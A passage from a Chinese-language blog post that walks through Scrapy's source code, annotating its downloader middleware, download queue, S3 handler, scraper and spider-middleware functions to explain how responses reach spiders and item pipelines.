class="comment">#否则执行download_func,这个就是传进来的self._enqueue_request</span></span><br><span class="line">            defer.returnValue((<span class="keyword">yield</span> download_func(request=request,spider=spider)))</span><br><span class="line"></span><br><span class="line"><span class="meta">        @defer.inlineCallbacks</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">process_response</span><span class="params">(response)</span>:</span></span><br><span class="line">        <span class="comment">#按字面意思来如果中间件有这个方法就执行，后面同理</span></span><br><span class="line">            <span class="keyword">assert</span> response <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>, <span class="string">'Received None in process_response'</span></span><br><span class="line">            <span class="keyword">if</span> isinstance(response, Request):</span><br><span class="line">                defer.returnValue(response)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> method <span class="keyword">in</span> self.methods[<span class="string">'process_response'</span>]:</span><br><span class="line">                response = <span class="keyword">yield</span> method(request=request, response=response,</span><br><span class="line">                                        spider=spider)</span><br><span class="line">                <span class="keyword">assert</span> isinstance(response, (Response, Request)), \</span><br><span class="line">                    <span class="string">'Middleware %s.process_response must return Response or Request, got %s'</span> % \</span><br><span class="line">                    (six.get_method_self(method).__class__.__name__, type(response))</span><br><span class="line">                <span class="keyword">if</span> isinstance(response, Request):</span><br><span class="line">                    defer.returnValue(response)</span><br><span class="line">            defer.returnValue(response)</span><br><span class="line"></span><br><span class="line"><span class="meta">        @defer.inlineCallbacks</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">process_exception</span><span class="params">(_failure)</span>:</span></span><br><span class="line">            exception = _failure.value</span><br><span class="line">            <span class="keyword">for</span> method <span class="keyword">in</span> self.methods[<span class="string">'process_exception'</span>]:</span><br><span class="line">                response = <span class="keyword">yield</span> method(request=request, exception=exception,</span><br><span class="line">                                        spider=spider)</span><br><span class="line">                <span class="keyword">assert</span> response <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> isinstance(response, (Response, Request)), \</span><br><span class="line">                    <span class="string">'Middleware %s.process_exception must return None, Response or Request, got %s'</span> % \</span><br><span class="line">                    (six.get_method_self(method).__class__.__name__, type(response))</span><br><span class="line">                <span class="keyword">if</span> response:</span><br><span class="line">                    defer.returnValue(response)</span><br><span class="line">            defer.returnValue(_failure)</span><br><span class="line"></span><br><span class="line">        deferred = mustbe_deferred(process_request, request)</span><br><span class="line">        <span class="comment">#差错检测</span></span><br><span class="line">        deferred.addErrback(process_exception)</span><br><span class="line">        <span class="comment">#进行回调</span></span><br><span class="line">        deferred.addCallback(process_response)</span><br><span class="line">        <span class="keyword">return</span> deferred</span><br></pre></td></tr></table></figure><p>等于说下载时，对request进行一些中间件操作，操作完以后进入<code>_enqueue_request</code>函数，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_enqueue_request</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        key, slot = self._get_slot(request, spider)</span><br><span class="line">        request.meta[<span class="string">'download_slot'</span>] = key</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">_deactivate</span><span class="params">(response)</span>:</span></span><br><span class="line">            slot.active.remove(request)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">        slot.active.add(request)</span><br><span class="line">        deferred = defer.Deferred().addBoth(_deactivate)</span><br><span class="line">        <span class="comment">#加入下载队列</span></span><br><span class="line">        slot.queue.append((request, deferred))</span><br><span class="line">        <span class="comment">#处理队列</span></span><br><span class="line">        self._process_queue(spider, slot)</span><br><span class="line">        <span class="keyword">return</span> deferred</span><br></pre></td></tr></table></figure><p>跟进<code>_process_queue</code>,相关函数也一并列出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_process_queue</span><span class="params">(self, spider, slot)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> slot.latercall <span class="keyword">and</span> slot.latercall.active():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Delay queue processing if a download_delay is configured</span></span><br><span class="line">        now = time()</span><br><span class="line">        delay = slot.download_delay()</span><br><span class="line">        <span class="keyword">if</span> delay:</span><br><span class="line">            penalty = delay - now + slot.lastseen</span><br><span class="line">            <span class="keyword">if</span> penalty &gt; <span class="number">0</span>:</span><br><span class="line">                slot.latercall = reactor.callLater(penalty, self._process_queue, spider, slot)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Process enqueued requests if there are free slots to transfer for this slot</span></span><br><span class="line">        <span class="keyword">while</span> slot.queue <span class="keyword">and</span> slot.free_transfer_slots() &gt; <span class="number">0</span>:</span><br><span class="line">            slot.lastseen = now</span><br><span class="line">            request, deferred = slot.queue.popleft()</span><br><span class="line">            <span class="comment">#开始真正下载</span></span><br><span class="line">            dfd = self._download(slot, request, spider)</span><br><span class="line">            dfd.chainDeferred(deferred)</span><br><span class="line">            <span class="comment"># prevent burst if inter-request delays were configured</span></span><br><span class="line">            <span class="keyword">if</span> delay:</span><br><span class="line">                self._process_queue(spider, slot)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_download</span><span class="params">(self, slot, request, spider)</span>:</span></span><br><span class="line">        <span class="comment"># The order is very important for the following deferreds. Do not change!</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. Create the download deferred</span></span><br><span class="line">      <span class="comment">#注册handlers下的download_request方法</span></span><br><span class="line">        dfd = mustbe_deferred(self.handlers.download_request, request, spider)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. Notify response_downloaded listeners about the recent download</span></span><br><span class="line">        <span class="comment"># before querying queue for next request</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">_downloaded</span><span class="params">(response)</span>:</span></span><br><span class="line">            self.signals.send_catch_log(signal=signals.response_downloaded,</span><br><span class="line">                                        response=response,</span><br><span class="line">                                        request=request,</span><br><span class="line">                                        spider=spider)</span><br><span class="line">            <span class="comment">#调用后返回</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">         <span class="comment">#注册好了就调用</span></span><br><span class="line">        dfd.addCallback(_downloaded)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. After response arrives,  remove the request from transferring</span></span><br><span class="line">        <span class="comment"># state to free up the transferring slot so it can be used by the</span></span><br><span class="line">        <span class="comment"># following requests (perhaps those which came from the downloader</span></span><br><span class="line">        <span class="comment"># middleware itself)</span></span><br><span class="line">        slot.transferring.add(request)</span><br><span class="line"><span class="comment">#结束后的操作</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">finish_transferring</span><span class="params">(_)</span>:</span></span><br><span class="line">            slot.transferring.remove(request)</span><br><span class="line">            <span class="comment">#处理队列</span></span><br><span class="line">            self._process_queue(spider, slot)</span><br><span class="line">            <span class="keyword">return</span> _</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dfd.addBoth(finish_transferring)</span><br></pre></td></tr></table></figure><p>官方注释的很清楚啊！！先跟进<code>download_request</code>方法，列出相关函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_request</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">  <span class="comment">#获取scheme，也就是连接是什么http,https,ftp之类的</span></span><br><span class="line">        scheme = urlparse_cached(request).scheme</span><br><span class="line">      <span class="comment">#不同的schema返回不同</span></span><br><span class="line">        handler = self._get_handler(scheme)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> handler:</span><br><span class="line">            <span class="keyword">raise</span> NotSupported(<span class="string">"Unsupported URL scheme '%s': %s"</span> %</span><br><span class="line">                               (scheme, self._notconfigured[scheme]))</span><br><span class="line">            <span class="comment">#ok去吧去 下载吧！！</span></span><br><span class="line">        <span class="keyword">return</span> handler.download_request(request, spider)</span><br><span class="line"><span class="comment">#下载就不进去了</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_request</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        p = urlparse_cached(request)</span><br><span class="line">        scheme = <span class="string">'https'</span> <span class="keyword">if</span> request.meta.get(<span class="string">'is_secure'</span>) <span class="keyword">else</span> <span class="string">'http'</span></span><br><span class="line">        bucket = p.hostname</span><br><span class="line">        path = p.path + <span class="string">'?'</span> + p.query <span class="keyword">if</span> p.query <span class="keyword">else</span> p.path</span><br><span class="line">        url = <span class="string">'%s://%s.s3.amazonaws.com%s'</span> % (scheme, bucket, path)</span><br><span class="line">        <span class="keyword">if</span> self.anon:</span><br><span class="line">            request = request.replace(url=url)</span><br><span class="line">        <span class="keyword">elif</span> self._signer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">import</span> botocore.awsrequest</span><br><span class="line">            awsrequest = botocore.awsrequest.AWSRequest(</span><br><span class="line">                method=request.method,</span><br><span class="line">                url=<span class="string">'%s://s3.amazonaws.com/%s%s'</span> % (scheme, bucket, path),</span><br><span class="line">                headers=request.headers.to_unicode_dict(),</span><br><span class="line">                data=request.body)</span><br><span class="line">            self._signer.add_auth(awsrequest)</span><br><span class="line">            request = request.replace(</span><br><span class="line">                url=url, headers=awsrequest.headers.items())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            signed_headers = self.conn.make_request(</span><br><span class="line">                    method=request.method,</span><br><span class="line">                    bucket=bucket,</span><br><span class="line">                    key=unquote(p.path),</span><br><span class="line">                    query_args=unquote(p.query),</span><br><span class="line">                    headers=request.headers,</span><br><span class="line">                    data=request.body)</span><br><span class="line">            request = request.replace(url=url, headers=signed_headers)</span><br><span class="line">        <span class="keyword">return</span> self._download_http(request, spider)</span><br></pre></td></tr></table></figure><p>下载这里就结束，回到最上面提到的处理下载返回结果那里，那里调用<code>self._handle_downloader_output</code>函数，在这里官方框架的第四五步结束了。以下对返回的结果进行分别对待，进行不同操作。后面官方架构步骤就会都完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_handle_downloader_output</span><span class="params">(self, response, request, spider)</span>:</span></span><br><span class="line">  <span class="comment">#三种结果选一种</span></span><br><span class="line">        <span class="keyword">assert</span> isinstance(response, (Request, Response, Failure)), response</span><br><span class="line">        <span class="comment"># downloader middleware can return requests (for example, redirects)</span></span><br><span class="line">      <span class="comment">#如果response是Request则再次调用该方法进入调度器，就是说的URL在此进入队列继续。</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(response, Request):</span><br><span class="line">            self.crawl(response, spider)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># response is a Response or Failure</span></span><br><span class="line">        d = self.scraper.enqueue_scrape(response, request, spider)</span><br><span class="line">        d.addErrback(<span class="keyword">lambda</span> f: logger.error(<span class="string">'Error while enqueuing downloader output'</span>,</span><br><span class="line">                                            exc_info=failure_to_exc_info(f),</span><br><span class="line">                                            extra=&#123;<span class="string">'spider'</span>: spider&#125;))</span><br><span class="line">        <span class="keyword">return</span> d</span><br></pre></td></tr></table></figure><p>同理官方注释很清楚。这回进入<code>enqueue_scrape</code>函数，列出相关函数，<code>函数不一定在一个文件里面</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slot</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""Scraper slot (one per running spider)"""</span></span><br><span class="line"></span><br><span class="line">    MIN_RESPONSE_SIZE = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, max_active_size=<span class="number">5000000</span>)</span>:</span></span><br><span class="line">        self.max_active_size = max_active_size</span><br><span class="line">        self.queue = deque()</span><br><span class="line">        self.active = set()</span><br><span class="line">        self.active_size = <span class="number">0</span></span><br><span class="line">        self.itemproc_size = <span class="number">0</span></span><br><span class="line">        self.closing = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_response_request</span><span class="params">(self, response, request)</span>:</span></span><br><span class="line">        deferred = defer.Deferred()</span><br><span class="line">        <span class="comment">#加入队列</span></span><br><span class="line">        self.queue.append((response, request, deferred))</span><br><span class="line">        <span class="keyword">if</span> isinstance(response, Response):</span><br><span class="line">            self.active_size += max(len(response.body), self.MIN_RESPONSE_SIZE)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.active_size += self.MIN_RESPONSE_SIZE</span><br><span class="line">        <span class="keyword">return</span> deferred</span><br><span class="line"></span><br><span class="line"><span class="comment">#该类后面还有</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enqueue_scrape</span><span class="params">(self, response, request, spider)</span>:</span></span><br><span class="line">        slot = self.slot</span><br><span class="line">        dfd = slot.add_response_request(response, request)</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">finish_scraping</span><span class="params">(_)</span>:</span></span><br><span class="line">            slot.finish_response(response, request)</span><br><span class="line">            self._check_if_closing(spider, slot)</span><br><span class="line">            self._scrape_next(spider, slot)</span><br><span class="line">            <span class="keyword">return</span> _</span><br><span class="line">        dfd.addBoth(finish_scraping)</span><br><span class="line">        dfd.addErrback(</span><br><span class="line">            <span class="keyword">lambda</span> f: logger.error(<span class="string">'Scraper bug processing %(request)s'</span>,</span><br><span class="line">                                   &#123;<span class="string">'request'</span>: request&#125;,</span><br><span class="line">                                   exc_info=failure_to_exc_info(f),</span><br><span class="line">                                   extra=&#123;<span class="string">'spider'</span>: spider&#125;))</span><br><span class="line">        self._scrape_next(spider, slot)</span><br><span class="line">        <span class="keyword">return</span> dfd</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_scrape_next</span><span class="params">(self, spider, slot)</span>:</span></span><br><span class="line">  <span class="comment">#拿出要处理的队列</span></span><br><span class="line">        <span class="keyword">while</span> slot.queue:</span><br><span class="line">            response, request, deferred = slot.next_response_request_deferred()</span><br><span class="line">            self._scrape(response, request, spider).chainDeferred(deferred)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_scrape</span><span class="params">(self, response, request, spider)</span>:</span></span><br><span class="line">        <span class="string">"""Handle the downloaded response or failure through the spider</span></span><br><span class="line"><span class="string">        callback/errback"""</span></span><br><span class="line">        <span class="keyword">assert</span> isinstance(response, (Response, Failure))</span><br><span class="line"><span class="comment">#进入_scrape2</span></span><br><span class="line">        dfd = self._scrape2(response, request, spider) <span class="comment"># returns spiders processed output</span></span><br><span class="line">        dfd.addErrback(self.handle_spider_error, request, response, spider)</span><br><span class="line">        <span class="comment">#从_scrape2回来后进入`handle_spider_output`</span></span><br><span class="line">        dfd.addCallback(self.handle_spider_output, request, response, spider)</span><br><span class="line">        <span class="keyword">return</span> dfd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_scrape2</span><span class="params">(self, request_result, request, spider)</span>:</span></span><br><span class="line">        <span class="string">"""Handle the different cases of request's result been a Response or a</span></span><br><span class="line"><span class="string">        Failure"""</span></span><br><span class="line">    <span class="comment">#进行区分</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(request_result, Failure):</span><br><span class="line">          <span class="comment">#如果是Response类型的调用中间件函数`scrape_response`进行处理，这个传进去call_spider函数</span></span><br><span class="line">            <span class="keyword">return</span> self.spidermw.scrape_response(</span><br><span class="line">                self.call_spider, request_result, request, spider)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># <span class="doctag">FIXME:</span> don't ignore errors in spider middleware</span></span><br><span class="line">            dfd = self.call_spider(request_result, request, spider)</span><br><span class="line">            <span class="keyword">return</span> dfd.addErrback(</span><br><span class="line">                self._log_download_errors, request_result, request, spider)</span><br><span class="line">          </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scrape_response</span><span class="params">(self, scrape_func, response, request, spider)</span>:</span></span><br><span class="line">        fname = <span class="keyword">lambda</span> f:<span class="string">'%s.%s'</span> % (</span><br><span class="line">                six.get_method_self(f).__class__.__name__,</span><br><span class="line">                six.get_method_function(f).__name__)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">process_spider_input</span><span class="params">(response)</span>:</span></span><br><span class="line">            <span class="keyword">for</span> method <span class="keyword">in</span> self.methods[<span class="string">'process_spider_input'</span>]:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    result = method(response=response, spider=spider)</span><br><span class="line">                    <span class="keyword">assert</span> result <span class="keyword">is</span> <span class="literal">None</span>, \</span><br><span class="line">                            <span class="string">'Middleware %s must returns None or '</span> \</span><br><span class="line">                            <span class="string">'raise an exception, got %s '</span> \</span><br><span class="line">                            % (fname(method), type(result))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">return</span> scrape_func(Failure(), request, spider)</span><br><span class="line">            <span class="keyword">return</span> scrape_func(response, request, spider)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">process_spider_exception</span><span class="params">(_failure)</span>:</span></span><br><span class="line">            exception = _failure.value</span><br><span class="line">            <span class="keyword">for</span> method <span class="keyword">in</span> self.methods[<span class="string">'process_spider_exception'</span>]:</span><br><span class="line">                result = method(response=response, exception=exception, spider=spider)</span><br><span class="line">                <span class="keyword">assert</span> result <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> _isiterable(result), \</span><br><span class="line">                    <span class="string">'Middleware %s must returns None, or an iterable object, got %s '</span> % \</span><br><span class="line">                    (fname(method), type(result))</span><br><span class="line">                <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">return</span> result</span><br><span class="line">            <span class="keyword">return</span> _failure</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">process_spider_output</span><span class="params">(result)</span>:</span></span><br><span class="line">            <span class="keyword">for</span> method <span class="keyword">in</span> self.methods[<span class="string">'process_spider_output'</span>]:</span><br><span class="line">                result = method(response=response, result=result, spider=spider)</span><br><span class="line">                <span class="keyword">assert</span> _isiterable(result), \</span><br><span class="line">                    <span class="string">'Middleware %s must returns an iterable object, got %s '</span> % \</span><br><span class="line">                    (fname(method), type(result))</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        dfd = mustbe_deferred(process_spider_input, response)</span><br><span class="line">        <span class="comment">#差错检测</span></span><br><span class="line">        dfd.addErrback(process_spider_exception)</span><br><span class="line">        <span class="comment">#进行回掉</span></span><br><span class="line">        dfd.addCallback(process_spider_output)</span><br><span class="line">        <span class="keyword">return</span> dfd</span><br></pre></td></tr></table></figure><p>先进入<code>call_spider</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_spider</span><span class="params">(self, result, request, spider)</span>:</span></span><br><span class="line">        result.request = request</span><br><span class="line">        dfd = defer_result(result)</span><br><span class="line">        <span class="comment">#自己定义的回调否则就是parse函数（我们项目经常写的）</span></span><br><span class="line">        dfd.addCallbacks(request.callback <span class="keyword">or</span> spider.parse, request.errback)</span><br><span class="line">        <span class="comment">#下面这个函数里面就一句话return arg_to_iter(result)</span></span><br><span class="line">        <span class="keyword">return</span> dfd.addCallback(iterate_spider_output)</span><br></pre></td></tr></table></figure><p>好的回去进入<code>handle_spider_output</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_spider_output</span><span class="params">(self, result, request, response, spider)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">            <span class="keyword">return</span> defer_succeed(<span class="literal">None</span>)</span><br><span class="line">      <span class="comment">#处理错误</span></span><br><span class="line">        it = iter_errback(result, self.handle_spider_error, request, response, spider)</span><br><span class="line">        <span class="comment">#得嘞又 注册了_process_spidermw_output</span></span><br><span class="line">        dfd = parallel(it, self.concurrent_items,</span><br><span class="line">            self._process_spidermw_output, request, response, spider)</span><br><span class="line">        <span class="keyword">return</span> dfd</span><br></pre></td></tr></table></figure><p>进入<code>_process_spidermw_output</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_process_spidermw_output</span><span class="params">(self, output, request, response, spider)</span>:</span></span><br><span class="line">        <span class="string">"""Process each Request/Item (given in the output parameter) returned</span></span><br><span class="line"><span class="string">        from the given spider</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    <span class="comment">#如果是Request，则加入调度器继续</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(output, Request):</span><br><span class="line">            self.crawler.engine.crawl(request=output, spider=spider)</span><br><span class="line">        <span class="keyword">elif</span> isinstance(output, (BaseItem, dict)):</span><br><span class="line">            self.slot.itemproc_size += <span class="number">1</span></span><br><span class="line">            <span class="comment">#调用Pipeline的process_item，你看看你写的项目是不是有这个</span></span><br><span class="line">            dfd = self.itemproc.process_item(output, spider)</span><br><span class="line">            dfd.addBoth(self._itemproc_finished, output, response, spider)</span><br><span class="line">            <span class="keyword">return</span> dfd</span><br><span class="line">        <span class="keyword">elif</span> output <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            typename = type(output).__name__</span><br><span class="line">            logger.error(<span class="string">'Spider must return Request, BaseItem, dict or None, '</span></span><br><span class="line">                         <span class="string">'got %(typename)r in %(request)s'</span>,</span><br><span class="line">                         &#123;<span class="string">'request'</span>: request, <span class="string">'typename'</span>: typename&#125;,</span><br><span class="line">                         extra=&#123;<span class="string">'spider'</span>: spider&#125;)</span><br></pre></td></tr></table></figure><p>官方注释可以啊，后面具体细节就不去看了。</p><h1 id="0x02-小结"><a href="#0x02-小结" class="headerlink" title="0x02.小结"></a>0x02.小结</h1><p>这次在全局搜索代码的时候发现好多一样的代码，可想框架很多地方是可以重写的。我们将官方的图补上</p><p><img src="http://myndtt.com/images/58.png" alt="7"></p><p>完成了4，5，6，7，8部分。这回这张图就完美了,引擎将下载结果给<code>蜘蛛</code>做<code>鉴定</code>，不同则进入不同地方。</p><p>scrapy框架看下来很多地方可以重写，但是一环扣一环的，主框架流程不能动。用到了异步，去重等…这么看来其实它也不神秘，但有些小细节我肯定没注意到。说不定错过精彩的地方也不一定，就这样吧..</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言&quot;&gt;&lt;/a&gt;0x00.前言&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://myndtt.com/2018/01/30/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%B8%80/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;前面一&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://myndtt.com/2018/01/31/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%BA%8C/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;前面二&lt;/a&gt;&lt;/p&gt;
